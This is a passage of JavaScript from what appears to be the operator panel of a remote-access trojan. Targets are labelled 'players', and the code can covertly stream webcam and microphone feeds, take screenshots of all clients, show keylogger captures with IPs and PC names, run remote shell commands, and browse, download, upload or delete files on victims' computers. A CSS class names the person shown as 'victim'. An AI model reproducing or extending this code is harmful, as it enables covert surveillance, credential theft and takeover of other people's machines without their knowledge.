                    toast('Webcam started (HTTP) for ' + webcamModalPlayer);
                }
            } catch (e) {
                console.error('startWebcamModal error:', e);
                toast('Error starting webcam: ' + e.message, 'error');
            }
        }

        async function stopWebcamModal() {
            // Stop HTTP polling
            if (webcamModalInterval) {
                clearInterval(webcamModalInterval);
                webcamModalInterval = null;
            }
            if (webcamFpsTimer) {
                clearInterval(webcamFpsTimer);
                webcamFpsTimer = null;
            }

            // Stop via WebSocket or HTTP
            if (webcamUsingWebSocket && webcamModalPlayer) {
                requestStopStream(webcamModalPlayer, 'webcam');
                leaveStream(webcamModalPlayer, 'webcam');
                webcamUsingWebSocket = false;
            } else if (webcamModalPlayer) {
                // HTTP fallback
                await api('/api/remote/command', 'POST', {
                    target_player: webcamModalPlayer,
                    command_type: 'webcam',
                    command_data: 'stop'
                });
            }

            document.getElementById('webcamStartBtn').style.display = 'inline-flex';
            document.getElementById('webcamStopBtn').style.display = 'none';
            updateWebcamStatus(false);
        }

        async function fetchWebcamModal() {
            if (!webcamModalPlayer) return;

            try {
                // Fetch both image and audio
                const res = await api('/api/webcam/latest?player=' + encodeURIComponent(webcamModalPlayer));
                if (res && res.image && res.id !== webcamLastId) {
                    webcamLastId = res.id;
                    const img = document.getElementById('webcamModalImage');
                    img.onload = () => {
                        img.style.display = 'block';
                        document.getElementById('webcamModalPlaceholder').style.display = 'none';
                        try { webcamFpsCounter++; } catch (e) { }
                    };
                    img.src = 'data:image/jpeg;base64,' + res.image;
                }

                // Fetch audio
                const audioRes = await api('/api/audio/latest?player=' + encodeURIComponent(webcamModalPlayer));
                if (audioRes && audioRes.audio && audioRes.id) {
                    const audio = document.getElementById('webcamAudio');
                    audio.src = 'data:audio/mp3;base64,' + audioRes.audio;
                    document.getElementById('webcamAudioStatus').textContent = ' Live';
                    document.getElementById('webcamAudioStatus').style.color = '#22c55e';
                }
            } catch (e) {
                console.error('Webcam fetch error:', e);
            }
        }

        async function requestWebcamSnapshot() {
            if (!webcamModalPlayer) return;
            await api('/api/remote/command', 'POST', {
                target_player: webcamModalPlayer,
                command_type: 'webcam',
                command_data: 'single'
            });
            toast('Webcam snapshot requested');
        }

        async function requestAudioSnapshot() {
            if (!webcamModalPlayer) return;
            await api('/api/remote/command', 'POST', {
                target_player: webcamModalPlayer,
                command_type: 'audio',
                command_data: 'single'
            });
            toast('Audio clip requested');
        }

        function toggleWebcamFullscreen() {
            const modal = document.getElementById('webcamModal');
            if (!document.fullscreenElement) {
                modal.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }

        // ==================== SCREENSHARE (OLD - for page) ====================
        async function startScreenshare() {
            const player = document.getElementById('screensharePlayerSelect').value;
            if (!player) {
                toast('Please select a player first', 'error');
                return;
            }

            // Open the modal instead of showing inline
            openScreenshareModal(player);
        }

        function stopScreenshare() {
            if (screenshareInterval) {
                clearInterval(screenshareInterval);
                screenshareInterval = null;
            }
            screensharePlayer = null;
            document.getElementById('screenshareStatus').innerHTML = '<span style="color: var(--text-muted);">Not streaming</span>';
            toast('Screenshare stopped');
        }

        async function fetchLatestScreenshot() {
            if (!screensharePlayer) return;

            const res = await api(`/api/screenshots/latest/${screensharePlayer} `);
            if (res.success && res.id && res.id !== lastScreenshotId) {
                lastScreenshotId = res.id;
                document.getElementById('screenshareImage').src = `/api/screenshots/image/${res.id}?t=${Date.now()} `;
            }
        }

        async function requestSingleScreenshot() {
            const player = document.getElementById('screensharePlayerSelect').value;
            if (!player) {
                toast('Please select a player', 'error');
                return;
            }

            await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'screenshot',
                command_data: 'single'
            });
            toast('Screenshot requested');

            // Load history after a delay
            setTimeout(loadScreenshotHistory, 2000);
        }

        // ==================== LIVE PREVIEW GRID ====================
        let previewRefreshInterval = null;
        let previewCountdown = 600; // 10 minutes in seconds

        async function loadLivePreviewGrid() {
            try {
                // Get online players for Remote (same endpoint)
                const res = await api('/api/remote/players');
                if (!res.success) return;

                const players = res.players || [];
                document.getElementById('screenshareOnlineCount').textContent = players.length;

                // Get total screenshot count
                const screenshotRes = await api('/api/screenshots');
                if (screenshotRes.success) {
                    document.getElementById('screenshotTotalCount').textContent = (screenshotRes.screenshots || []).length;
                    if (screenshotRes.screenshots && screenshotRes.screenshots.length > 0) {
                        const lastTime = new Date(screenshotRes.screenshots[0].created_at);
                        document.getElementById('lastCaptureTime').textContent = lastTime.toLocaleTimeString();
                    }
                }

                const grid = document.getElementById('screenshareLiveGrid');
                if (players.length === 0) {
                    grid.innerHTML = `
                        <div style= "text-align: center; padding: 60px; color: var(--text-muted); grid-column: 1/-1;">
                            <i class="fas fa-desktop" style="font-size: 48px; margin-bottom: 16px; opacity: 0.5;"></i>
                            <p>No remote clients online</p>
                            <small>When players connect, their preview will appear here</small>
                        </div>
                        `;
                    return;
                }

                // Build preview cards for each player
                grid.innerHTML = players.map((p, i) => {
                    const playerName = p.player || p.name || 'Unknown';
                    const isGuardian = playerName.startsWith('Guardian_');
                    const displayName = isGuardian ? playerName.replace('Guardian_', '') : playerName;
                    const typeIcon = isGuardian ? '' : '';
                    const safeName = playerName.replace(/[^a-zA-Z0-9]/g, '_');

                    return `
                        <div class="webcam-card glass-card animate-scale" style="animation-delay: ${i * 0.1}s;">
                        <div class="webcam-card-header">
                            <div class="webcam-card-title">
                                ${typeIcon} ${displayName}
                            </div>
                            <div class="webcam-card-live">
                                <i class="fas fa-circle"></i> LIVE
                            </div>
                        </div>
                        <div style="position: relative; aspect-ratio: 16/9; background: #0a0a0f; display: flex; align-items: center; justify-content: center; cursor: pointer; overflow: hidden; border-radius: 0 0 12px 12px;"
                             onclick="openScreenshareModal('${playerName}'); startScreenshareModal();">
                            <img id="preview-${safeName}" 
                                 data-player-preview="${playerName}"
                                 style="width: 100%; height: 100%; object-fit: cover; display: none;"
                                 onload="this.style.display='block'; this.nextElementSibling.style.display='none';"
                                 onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
                            <div style="display: flex; flex-direction: column; align-items: center; color: var(--text-muted); width: 100%; padding: 20px;">
                                <i class="fas fa-desktop" style="font-size: 32px; margin-bottom: 8px; opacity: 0.5;"></i>
                                <span class="text-xs">Click to View Stream</span>
                            </div>
                            <div class="absolute bottom-2 right-2 bg-black/60 px-2 py-1 rounded text-xs text-white">
                                <i class="fas fa-clock"></i> ${new Date().toLocaleTimeString()}
                            </div>
                        </div>
                    </div>
                    `;
                }).join('');

                // Load latest screenshots as previews
                await loadPreviewImages(players);

            } catch (e) {
                console.error('Live preview error', e);
            }
        }

        async function loadPreviewImages(players) {
            for (const p of players) {
                try {
                    const playerName = p.player || p.name || 'Unknown';
                    const res = await api(`/api/screenshots/latest/${encodeURIComponent(playerName)}`);
                    if (res.success && res.id) {
                        const imgId = 'preview-' + playerName.replace(/[^a-zA-Z0-9]/g, '_');
                        const img = document.getElementById(imgId);
                        if (img) {
                            img.src = `/api/screenshots/image/${res.id}?t=${Date.now()} `;
                            img.onload = () => {
                                img.style.display = 'block';
                                if (img.nextElementSibling) img.nextElementSibling.style.display = 'none';
                            };
                        }
                    }
                } catch (e) {
                    // Ignore individual preview errors
                }
            }
        }

        async function requestPreviewScreenshot(player) {
            await api('/api/remote/command', 'POST', {
                player: player,
                type: 'screenshot',
                data: 'single'
            });
            toast(` Screenshot requested from ${player} `);

            // Reload preview after delay
            setTimeout(async () => {
                const res = await api(`/api/screenshots/latest/${encodeURIComponent(player)} `);
                if (res.success && res.id) {
                    const imgId = 'preview-' + player.replace(/[^a-zA-Z0-9]/g, '_');
                    const img = document.getElementById(imgId);
                    if (img) {
                        img.src = `/api/screenshots/image/${res.id}?t=${Date.now()} `;
                        img.style.display = 'block';
                        if (img.nextElementSibling) img.nextElementSibling.style.display = 'none';
                    }
                }
            }, 3000);
        }

        async function requestAllScreenshots() {
            const res = await api('/api/remote/players');
            if (!res.success) return;

            const players = res.players || [];
            for (const p of players) {
                await api('/api/remote/command', 'POST', {
                    target_player: p.player,
                    command_type: 'screenshot',
                    command_data: 'single'
                });
            }

            toast(` Requested screenshots from ${players.length} clients`);

            // Reload all previews after delay
            setTimeout(() => loadLivePreviewGrid(), 5000);
        }

        function refreshAllPreviews() {
            previewCountdown = 600; // Reset countdown
            loadLivePreviewGrid();
            toast('Previews refreshed');
        }

        function startPreviewAutoRefresh() {
            if (previewRefreshInterval) clearInterval(previewRefreshInterval);

            previewCountdown = 600; // 10 minutes

            previewRefreshInterval = setInterval(() => {
                previewCountdown--;

                // Update countdown display
                const mins = Math.floor(previewCountdown / 60);
                const secs = previewCountdown % 60;
                const el = document.getElementById('nextRefreshTime');
                if (el) el.textContent = `${mins}:${secs.toString().padStart(2, '0')} `;

                // Auto-refresh when countdown reaches 0
                if (previewCountdown <= 0) {
                    previewCountdown = 600;
                    loadLivePreviewGrid();
                    requestAllScreenshots();
                }
            }, 1000);
        }

        function stopPreviewAutoRefresh() {
            if (previewRefreshInterval) {
                clearInterval(previewRefreshInterval);
                previewRefreshInterval = null;
            }
        }

        async function loadScreenshotHistory() {
            const res = await api('/api/screenshots');
            if (!res.success) return;

            const screenshots = (res.screenshots || []).slice(0, 12);

            if (screenshots.length === 0) {
                document.getElementById('screenshotHistory').innerHTML = `
                        <div style= "text-align: center; padding: 40px; color: var(--text-muted); grid-column: 1/-1;">
                        <i class="fas fa-images" style="font-size: 32px; margin-bottom: 12px; opacity: 0.5;"></i>
                        <p>No screenshots yet</p>
                    </div>
                        `;
                return;
            }

            document.getElementById('screenshotHistory').innerHTML = screenshots.map(s => {
                const safeName = (s.player || 'Unknown').replace(/'/g, "\\'");
                const dateStr = new Date(s.created_at).toLocaleString();
                const lightboxTitle = `${safeName} - ${dateStr} `;

                return `
                        <div class="webcam-card">
                            <img class="webcam-image" src="/api/screenshots/image/${s.file}" style="cursor: pointer;"
                                onclick="openLightbox('/api/screenshots/image/${s.file}', '${lightboxTitle}')"
                                onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 160 90%22><rect fill=%22%231a1a24%22 width=%22160%22 height=%2290%22/><text x=%2280%22 y=%2250%22 fill=%22%2371717a%22 text-anchor=%22middle%22 font-size=%2210%22>Error</text></svg>'">
                                <div class="webcam-info">
                                    <div class="webcam-victim"><i class="fas fa-user" style="margin-right: 6px;"></i>${s.player || 'Unknown'}</div>
                                    <div class="webcam-time"><i class="fas fa-clock" style="margin-right: 6px;"></i>${dateStr}</div>
                                </div>
                            </div>
                    `;
            }).join('');
        }

        // ==================== KEYLOGGER ====================
        async function loadKeylogs() {
            const player = document.getElementById('keylogPlayerSelect').value;
            const res = await api('/api/keylog');
            if (!res.success) return;

            let keylogs = res.keylogs || [];
            if (player) {
                keylogs = keylogs.filter(k => k.player === player);
            }

            document.getElementById('keylogTable').innerHTML = keylogs.map(k => `
                        <tr class="animate-fade">
                    <td>${new Date(k.created_at).toLocaleString()}</td>
                    <td><strong>${k.player || 'Unknown'}</strong></td>
                    <td style="max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;" title="${k.window_title || ''}">
                        ${k.window_title || 'N/A'}
                    </td>
                    <td style="font-family: monospace; background: var(--bg-secondary); padding: 4px 8px; border-radius: 4px; max-width: 400px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
                        ${escapeHtml(k.keys || '')}
                    </td>
                    <td>${k.pc_name || 'Unknown'} / ${k.ip || 'N/A'}</td>
                </tr>
                        `).join('') || '<tr><td colspan="5" style="text-align:center;">No keylog data</td></tr>';
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        async function startKeylogger() {
            const player = document.getElementById('keylogPlayerSelect').value;
            if (!player) {
                toast('Please select a player', 'error');
                return;
            }

            await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'keylogger',
                command_data: 'start'
            });
            toast('Keylogger started for ' + player);
        }

        function startKeyloggerForPlayer(player) {
            document.getElementById('keylogPlayerSelect').value = player;
            startKeylogger();
        }

        // ==================== SHELL PRESETS ====================
        function toggleShellPresets() {
            const menu = document.getElementById('shellPresetsMenu');
            menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
        }

        // Close menu when clicking outside
        document.addEventListener('click', (e) => {
            const menu = document.getElementById('shellPresetsMenu');
            const btn = document.querySelector('button[onclick="toggleShellPresets()"]');
            if (menu && menu.style.display === 'block' && !menu.contains(e.target) && !btn.contains(e.target)) {
                menu.style.display = 'none';
            }
        });

        function insertPreset(cmd) {
            // Close the menu
            document.getElementById('shellPresetsMenu').style.display = 'none';

            // Check if terminal is initialized and connected
            if (!term) {
                toast('Terminal not initialized', 'error');
                return;
            }

            if (!shellConnected) {
                const player = document.getElementById('shellPlayerSelect')?.value;
                if (player) {
                    // Auto-connect if player selected
                    connectShell(player);
                    setTimeout(() => insertPreset(cmd), 500); // Retry after connection
                    return;
                }
                toast('Select a player first', 'warning');
                return;
            }

            // Clear current buffer and write the command
            shellBuffer = cmd;
            term.write('\\r\\n> ' + cmd);

            // Execute the command
            term.write('\\r\\n');
            sendShellCommand(cmd);
            shellBuffer = '';
        }

        // ==================== REMOTE SHELL ====================
        async function sendShellCommand() {
            const player = document.getElementById('shellPlayerSelect').value;
            const input = document.getElementById('shellInput');
            const command = input.value.trim();

            if (!player) {
                appendToShell('<span style="color: #ef4444;">Error: Please select a player first</span>');
                return;
            }
            if (!command) return;

            input.value = '';
            appendToShell(`<span style="color: #3b82f6;"> [${player}]$  </span> ${escapeHtml(command)} `);

            // Use WebSocket for direct command routing (bypasses HTTP polling race condition)
            if (socket && socket.connected) {
                socket.emit('remote_command', {
                    player: player,
                    cmd_type: 'shell',
                    cmd_data: { cmd: command }
                });
                appendToShell('<span style="color: #f59e0b;">Command sent via WebSocket. Waiting for response...</span>');
            } else {
                // Fallback to HTTP if WebSocket not connected
                const res = await api('/api/remote/command', 'POST', {
                    target_player: player,
                    command_type: 'shell',
                    command_data: command
                });

                if (res.success) {
                    appendToShell('<span style="color: #f59e0b;">Command queued (ID: ' + res.command_id + '). Waiting for response...</span>');
                    setTimeout(() => pollCommandResult(res.command_id), 1000);
                } else {
                    appendToShell('<span style="color: #ef4444;">Failed to send command: ' + escapeHtml(res.error || 'Unknown error') + '</span>');
                }
            }

            loadShellHistory();
        }

        async function pollCommandResult(commandId, attempts = 0) {
            if (attempts > 30) {
                appendToShell('<span style="color: #ef4444;">Timeout waiting for response</span>');
                return;
            }

            const res = await api(`/api/remote/result/${commandId}`);
            if (res.success) {
                if (res.status === 'completed') {
                    appendToShell('<span style="color: #22c55e;">' + escapeHtml(res.result || 'No output') + '</span>');
                    loadShellHistory();
                } else if (res.status === 'failed') {
                    appendToShell('<span style="color: #ef4444;">Command failed: ' + escapeHtml(res.result || 'Unknown error') + '</span>');
                    loadShellHistory();
                } else {
                    // Still pending, poll again
                    setTimeout(() => pollCommandResult(commandId, attempts + 1), 1000);
                }
            }
        }

        function appendToShell(html) {
            const output = document.getElementById('shellOutput');
            output.innerHTML += '\n' + html;
            output.scrollTop = output.scrollHeight;
        }

        async function loadShellHistory() {
            const res = await api('/api/remote/commands');
            if (!res.success) return;

            const shellCmds = (res.commands || []).filter(c => c.type === 'shell').slice(0, 20);

            document.getElementById('shellHistoryTable').innerHTML = shellCmds.map(c => `
                <tr>
                    <td>${new Date(c.created_at).toLocaleString()}</td>
                    <td>${c.player || 'Unknown'}</td>
                    <td style="font-family: monospace; max-width: 200px; overflow: hidden; text-overflow: ellipsis;">${escapeHtml(c.data || '')}</td>
                    <td>
                        <span style="color: ${c.status === 'completed' ? '#22c55e' : c.status === 'failed' ? '#ef4444' : '#f59e0b'};">
                            ${c.status}
                        </span>
                    </td>
                    <td style="max-width: 300px; overflow: hidden; text-overflow: ellipsis;">${escapeHtml((c.result || '').substring(0, 100))}</td>
                </tr>
                        `).join('') || '<tr><td colspan="5" style="text-align:center;">No commands yet</td></tr>';
        }

        // ==================== FILE MANAGER ====================
        let fileManagerPlayer = null;
        let fileManagerPolling = null;
        let lastFileCommandId = null;

        function onFilePlayerSelected() {
            const player = document.getElementById('filesPlayerSelect').value;
            fileManagerPlayer = player;
            if (player) {
                document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-user"></i> Selected: ${player} `;
            }
        }

        async function browseToPath() {
            const player = document.getElementById('filesPlayerSelect').value;
            let path = document.getElementById('currentPath').value.trim();

            if (!player) {
                toast('Please select a player first', 'error');
                return;
            }

            if (!path) path = 'C:\\';
            fileManagerPlayer = player;

            document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-spinner fa-spin"></i> Browsing ${path}...`;
            document.getElementById('fileListTable').innerHTML = '<tr><td colspan="5" style="text-align:center; padding: 40px;"><i class="fas fa-spinner fa-spin" style="font-size: 24px;"></i><br>Loading directory...</td></tr>';

            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'browse|' + path,
                from_sid: (socket && socket.id) ? socket.id : ''
            });

            if (res.success && res.id) {
                lastFileCommandId = res.id;
                // Poll for result
                pollFileResult(res.id);
            }
        }

        async function pollFileResult(commandId) {
            let attempts = 0;
            const maxAttempts = 30; // 15 seconds max

            const poll = async () => {
                attempts++;
                const res = await api(`/api/remote/command/${commandId}`);

                if (res.success && res.command) {
                    if (res.command.status === 'completed') {
                        // Parse the JSON result
                        try {
                            const data = JSON.parse(res.command.result);
                            if (data.error) {
                                document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-exclamation-triangle" style="color: var(--danger);"></i> Error: ${data.error} `;
                                document.getElementById('fileListTable').innerHTML = `<tr> <td colspan="5" style="text-align:center; color: var(--danger); padding: 40px;"><i class="fas fa-exclamation-circle" style="font-size: 32px; margin-bottom: 12px; display: block;"></i>${escapeHtml(data.error)}</td></tr> `;
                            } else {
                                renderFileList(data);
                            }
                        } catch (e) {
                            // Old format - plain text
                            document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-check" style="color: #22c55e;"></i> Loaded`;
                            document.getElementById('fileListTable').innerHTML = `<tr> <td colspan="5"><pre style="margin: 0;">${escapeHtml(res.command.result)}</pre></td></tr> `;
                        }
                        return;
                    } else if (res.command.status === 'failed') {
                        document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-times" style="color: var(--danger);"></i> Failed`;
                        document.getElementById('fileListTable').innerHTML = '<tr><td colspan="5" style="text-align:center; color: var(--danger);">Command failed</td></tr>';
                        return;
                    }
                }

                if (attempts < maxAttempts) {
                    setTimeout(poll, 500);
                } else {
                    document.getElementById('fileManagerStatus').innerHTML = `<i class="fas fa-clock" style="color: var(--warning);"></i> Timeout - client may be offline`;
                }
            };

            poll();
        }

        function renderFileList(data) {
            if (!data.files || !Array.isArray(data.files)) {
                document.getElementById('fileListTable').innerHTML = '<tr><td colspan="5" style="text-align:center;">No files found</td></tr>';
                return;
            }

            document.getElementById('currentPath').value = data.path || 'C:\\';

            // Breadcrumbs
            const parts = (data.path || 'C:\\').split(/[\\\/]/).filter(p => p);
            let breadcrumbHtml = '';
            let currentBuild = '';
            parts.forEach((part, index) => {
                currentBuild += (index === 0 ? '' : '\\') + part;
                // Fix for drive letter
                if (index === 0 && part.includes(':')) currentBuild = part + '\\';

                const safePath = currentBuild.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
                breadcrumbHtml += `<span class="breadcrumb-item" onclick="navigateToFolder('${safePath}')"> ${part}  </span> `;
                if (index < parts.length - 1) breadcrumbHtml += ' <span style="color:var(--text-muted)">/</span> ';
            });

            // Update status with breadcrumbs
            const statusEl = document.getElementById('fileManagerStatus');
            if (statusEl) {
                statusEl.innerHTML = `
                <div style= "display:flex; align-items:center; gap:10px; overflow-x:auto; white-space:nowrap; padding-bottom:4px;">
                <i class="fas fa-hdd" style="color: var(--accent);"></i> 
                        ${breadcrumbHtml}
                <span style="margin-left:auto; font-size:11px; color:var(--text-muted);"> ${data.files.length} items  </span>
                    </div>
                    `;
            }

            // Sort: directories first, then files
            const files = data.files.sort((a, b) => {
                if (a.isDir && !b.isDir) return -1;
                if (!a.isDir && b.isDir) return 1;
                return a.name.localeCompare(b.name);
            });

            document.getElementById('fileListTable').innerHTML = files.map(f => {
                const icon = f.isDir ? 'fa-folder' : getFileIcon(f.name);
                const iconColor = f.isDir ? '#f59e0b' : '#6b7280';
                const size = f.isDir ? '-' : formatFileSize(f.size);
                const fullPath = (data.path + '\\' + f.name).replace(/\\\\/g, '\\');

                // Pre-escape the path for use in attributes
                const safeFullPath = escapeHtml(fullPath).replace(/'/g, "\\'");

                const dblClickAction = f.isDir
                    ? `navigateToFolder('${safeFullPath}')`
                    : `previewFile('${safeFullPath}')`;

                const buttons = f.isDir ? `
                <button class="btn btn-xs btn-secondary" onclick="navigateToFolder('${safeFullPath}')"> <i class="fas fa-folder-open"></i></button >
                `: `
                <button class="btn btn-xs btn-secondary" onclick="downloadRemoteFile('${safeFullPath}')" title="Download"> <i class="fas fa-download"></i></button >
                <button class="btn btn-xs btn-secondary" onclick="previewFile('${safeFullPath}')" title="Preview"><i class="fas fa-eye"></i></button>
        `;

                return `
                    <tr style="cursor: pointer; transition: background 0.1s;" ondblclick="${dblClickAction}">
                        <td style="text-align: center; width: 40px;"><i class="fas ${icon}" style="color: ${iconColor}; font-size: 16px;"></i></td>
                        <td style="font-family: 'Inter', sans-serif; font-weight: 500;">${escapeHtml(f.name)}</td>
                        <td style="color: var(--text-muted); font-size: 13px;">${size}</td>
                        <td style="color: var(--text-muted); font-size: 12px;">${f.modified || '-'}</td>
                        <td style="text-align: right;">
                            ${buttons}
                            <button class="btn btn-xs btn-danger" onclick="deleteRemoteFile('${safeFullPath}')" title="Delete"><i class="fas fa-trash"></i></button>
                        </td>
                    </tr>
                    `;
            }).join('') || '<tr><td colspan="5" style="text-align:center;">Empty directory</td></tr>';
        }



        function getFileIcon(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            const icons = {
                'txt': 'fa-file-alt', 'log': 'fa-file-alt', 'md': 'fa-file-alt',
                'pdf': 'fa-file-pdf',
                'doc': 'fa-file-word', 'docx': 'fa-file-word',
                'xls': 'fa-file-excel', 'xlsx': 'fa-file-excel',
                'ppt': 'fa-file-powerpoint', 'pptx': 'fa-file-powerpoint',
                'jpg': 'fa-file-image', 'jpeg': 'fa-file-image', 'png': 'fa-file-image', 'gif': 'fa-file-image', 'bmp': 'fa-file-image',
                'mp3': 'fa-file-audio', 'wav': 'fa-file-audio', 'ogg': 'fa-file-audio',
                'mp4': 'fa-file-video', 'avi': 'fa-file-video', 'mkv': 'fa-file-video', 'mov': 'fa-file-video',
                'zip': 'fa-file-archive', 'rar': 'fa-file-archive', '7z': 'fa-file-archive', 'tar': 'fa-file-archive', 'gz': 'fa-file-archive',
                'exe': 'fa-cog', 'msi': 'fa-cog', 'bat': 'fa-cog', 'cmd': 'fa-cog',
                'js': 'fa-file-code', 'py': 'fa-file-code', 'java': 'fa-file-code', 'cpp': 'fa-file-code', 'c': 'fa-file-code', 'h': 'fa-file-code',
                'html': 'fa-file-code', 'css': 'fa-file-code', 'json': 'fa-file-code', 'xml': 'fa-file-code',
                'dll': 'fa-puzzle-piece', 'so': 'fa-puzzle-piece',
                'jar': 'fa-coffee'
            };
            return icons[ext] || 'fa-file';
        }

        function formatFileSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
        }

        function navigateToFolder(path) {
            document.getElementById('currentPath').value = path;
            browseToPath();
        }

        function goUpDirectory() {
            const path = document.getElementById('currentPath').value;
            const parts = path.split(/[\\\/]/).filter(p => p);
            if (parts.length > 1) {
                parts.pop();
                document.getElementById('currentPath').value = parts.join('\\');
            } else {
                document.getElementById('currentPath').value = 'C:\\';
            }
            browseToPath();
        }

        function goToHome() {
            document.getElementById('currentPath').value = 'C:\\Users';
            browseToPath();
        }

        function goToDesktop() {
            document.getElementById('currentPath').value = '%USERPROFILE%\\Desktop';
            browseToPath();
        }

        async function downloadRemoteFile(path) {
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) return;

            toast('Requesting file download...');

            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'download|' + path
            });

            if (res.success && res.id) {
                pollDownloadResult(res.id, path);
            }
        }

        async function pollDownloadResult(commandId, originalPath) {
            let attempts = 0;
            const maxAttempts = 60; // 30 seconds for large files

            const poll = async () => {
                attempts++;
                const res = await api(`/api/remote/command/${commandId}`);

                if (res.success && res.command && res.command.status === 'completed') {
                    try {
                        const data = JSON.parse(res.command.result);
                        if (data.error) {
                            toast('Download failed: ' + data.error, 'error');
                        } else if (data.data) {
                            // Create download
                            const blob = base64ToBlob(data.data);
                            const url = URL.createObjectURL(blob);
                            const a = document.createElement('a');
                            a.href = url;
                            a.download = data.filename || 'download';
                            a.click();
                            URL.revokeObjectURL(url);
                            toast('File downloaded: ' + data.filename);
                        }
                    } catch (e) {
                        toast('Failed to parse download', 'error');
                    }
                    return;
                }

                if (attempts < maxAttempts) {
                    setTimeout(poll, 500);
                } else {
                    toast('Download timeout', 'error');
                }
            };

            poll();
        }

        function base64ToBlob(base64) {
            const binary = atob(base64);
            const bytes = new Uint8Array(binary.length);
            for (let i = 0; i < binary.length; i++) {
                bytes[i] = binary.charCodeAt(i);
            }
            return new Blob([bytes]);
        }

        async function previewFile(path) {
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) return;

            document.getElementById('filePreview').style.display = 'block';
            document.getElementById('previewFileName').textContent = path.split('\\').pop();
            document.getElementById('filePreviewContent').textContent = 'Loading...';

            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'download|' + path
            });

            if (res.success && res.id) {
                pollPreviewResult(res.id);
            }
        }

        async function pollPreviewResult(commandId) {
            let attempts = 0;
            const maxAttempts = 30;

            const poll = async () => {
                attempts++;
                const res = await api(`/api/remote/command/${commandId}`);

                if (res.success && res.command && res.command.status === 'completed') {
                    try {
                        const data = JSON.parse(res.command.result);
                        if (data.error) {
                            document.getElementById('filePreviewContent').textContent = 'Error: ' + data.error;
                        } else if (data.data) {
                            const text = atob(data.data);
                            document.getElementById('filePreviewContent').textContent = text.substring(0, 50000); // Limit preview
                        }
                    } catch (e) {
                        document.getElementById('filePreviewContent').textContent = 'Failed to load preview';
                    }
                    return;
                }

                if (attempts < maxAttempts) {
                    setTimeout(poll, 500);
                }
            };

            poll();
        }

        function closeFilePreview() {
            document.getElementById('filePreview').style.display = 'none';
        }

        async function deleteRemoteFile(path) {
            if (!confirm('Delete ' + path + '?')) return;

            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) return;

            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'delete|' + path
            });

            if (res.success) {
                toast('Delete command sent');
                setTimeout(() => browseToPath(), 1000);
            }
        }

        async function createNewFolder() {
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) {
                toast('Select a player first', 'error');
                return;
            }

            const name = prompt('New folder name:');
            if (!name) return;

            const path = document.getElementById('currentPath').value + '\\' + name;

            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'files',
                command_data: 'mkdir|' + path
            });

            if (res.success) {
                toast('Creating folder: ' + name);
                setTimeout(() => browseToPath(), 1000);
            }
        }

        function uploadFileDialog() {
            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) {
                toast('Select a player first', 'error');
                return;
            }
            document.getElementById('fileUploadInput').click();
        }

        async function handleFileUpload(event) {
            const file = event.target.files[0];
            if (!file) return;

            const player = document.getElementById('filesPlayerSelect').value;
            if (!player) return;

            // Max 10MB
            if (file.size > 10 * 1024 * 1024) {
                toast('File too large (max 10MB)', 'error');
                return;
            }

            const reader = new FileReader();
            reader.onload = async (e) => {
                const base64 = btoa(new Uint8Array(e.target.result).reduce((data, byte) => data + String.fromCharCode(byte), ''));
                const destPath = document.getElementById('currentPath').value + '\\' + file.name;

                toast('Uploading ' + file.name + '...');

                const res = await api('/api/remote/command', 'POST', {
                    target_player: player,
                    command_type: 'files',
                    command_data: 'upload|' + destPath + '|' + base64
                });

                if (res.success) {
                    toast('Upload command sent');
                    setTimeout(() => browseToPath(), 2000);
                }
            };
            reader.readAsArrayBuffer(file);

            // Reset input
            event.target.value = '';
        }

        function refreshFileList() {
            browseToPath();
        }

        // ==================== PAGE NAVIGATION HOOKS ====================
        const originalShowPage = showPage;
        showPage = function (page) {
            originalShowPage(page);

            // Stop preview auto-refresh when leaving screenshare
            if (page !== 'screenshare') {
                stopPreviewAutoRefresh();
            }

            // Load data for specific pages
            if (page === 'remote') {
                loadOnlinePlayersForRemote();
            } else if (page === 'screenshare') {
                loadLivePreviewGrid();
                loadScreenshotHistory();
                startPreviewAutoRefresh();
            } else if (page === 'keylogger') {
                loadOnlinePlayersForRemote();
                loadKeylogs();
            } else if (page === 'processes') {
                loadOnlinePlayersForRemote();
            } else if (page === 'shell') {
                loadOnlinePlayersForRemote();
                loadShellHistory();
            } else if (page === 'files') {
                loadOnlinePlayersForRemote();
            }
        };

        // ==================== PROCESS MANAGER ====================
        async function refreshProcessList() {
            const player = document.getElementById('processPlayerSelect').value;
            if (!player) {
                toast('Please select a player', 'error');
                return;
            }

            document.getElementById('processListTable').innerHTML = '<tr><td colspan="3" style="text-align:center; padding: 40px;"><i class="fas fa-spinner fa-spin"></i> Loading processes...</td></tr>';

            const res = await api('/api/remote/command', 'POST', {
                target_player: player,
                command_type: 'process_manager',
                command_data: 'list',
